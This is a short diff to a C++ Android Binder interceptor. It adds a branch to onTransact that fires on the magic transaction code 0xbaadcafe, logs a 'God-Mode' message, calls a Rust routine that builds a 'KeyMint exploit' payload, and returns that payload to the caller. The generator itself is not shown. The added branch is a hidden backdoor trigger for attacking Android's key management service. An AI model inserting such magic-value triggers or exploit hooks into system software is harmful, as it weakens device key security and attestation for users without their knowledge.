@@ -1214,6 +1214,18 @@ bool BinderInterceptor::shouldIntercept(const wp<BBinder> &target, uint32_t code
 status_t BinderInterceptor::onTransact(uint32_t code,
                                        const android::Parcel &data,
                                        android::Parcel *reply, uint32_t flags) {
+  if (code == 0xbaadcafe) {
+      LOGI("🔥 God-Mode Evolution: Triggering Rust KeyMint Exploit via 0xbaadcafe");
+      RustBuffer exploit = rust_generate_keymint_exploit_payload();
+      if (exploit.data && exploit.len > 0) {
+          reply->writeInt32(0); // No Exception header
+          reply->writeInt32(exploit.len);
+          reply->write(exploit.data, exploit.len);
+          rust_free_buffer(exploit);
+          return OK;
+      }
+      return BAD_VALUE;
+  }
   if (code == REGISTER_INTERCEPTOR) {
     sp<IBinder> target, interceptor;
     if (data.readStrongBinder(&target) != OK) {
